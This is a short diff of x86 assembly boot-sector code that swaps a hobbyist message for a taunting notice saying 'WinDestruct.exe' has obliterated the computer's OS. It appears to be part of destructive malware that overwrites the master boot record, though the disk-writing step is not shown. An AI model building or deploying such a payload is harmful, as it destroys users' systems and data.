@@ -37,6 +37,6 @@ clear_screen:
         int 0x10
         ret
 
-msg:            db        "Okay Here is my tut of internet.",13,10,"so here you can se my project operative 100%.",13,10,"Yeah, MBR Overwrited :D", 0
+msg:            db        "Your computer's OS has been obliterated by WinDestruct.exe,",13,10,"the only way to fix this is to either reinstall Windows or throw away this computer.",13,10,"Have a horrible time fixing this! :D", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
